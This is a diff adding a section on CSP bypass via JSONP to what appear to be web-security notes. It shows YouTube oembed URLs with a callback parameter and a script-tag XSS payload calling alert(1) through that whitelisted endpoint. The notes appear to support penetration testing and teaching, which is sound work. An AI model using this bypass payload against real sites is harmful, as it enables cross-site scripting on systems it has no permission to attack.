@@ -101,8 +101,25 @@ JSONP means json with padding is just a method to retrieve json data from a diff
 also is subject to the same origin policy. when you use this method you use a callback function method in the query parameters for the url and the
 callback function will retrieve the data. so using this method you will not be blocked by the csp policy restriction.
 
-this is normally achieved when the csp policy is allowing third party urls or domains to get data from.
+this is normally achieved when the csp policy is allowing third party urls or domains to get data from. 
 
+like https://www.google.com or https://www.youtube.com
+
+samples:
+
+> first link will show the raw data in json format, you need to use the callback oembeb feature and you need to select the youtube video you want
+to retrieve, remember that data is not critical, however is a way to trigger other functions like alert() to discover XSS.
+	
+https://youtube.com/oembed?url=https://www.youtube.com/watch?v=bQki6llaaTs
+
+> second link will show you how to use the callback to use functions, 
+	
+https://youtube.com/oembed?url=https://www.youtube.com/watch?v=bQki6llaaTs&callback=test()
+
+> third link is actually the suspicious trigger
+
+&lt;script/src x=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=bQki6llaaTs&callback=alert(1)&gt;&lt;/script&gt;
+	
 </details>
 <details>
 <summary>bypass via fileupload</summary>
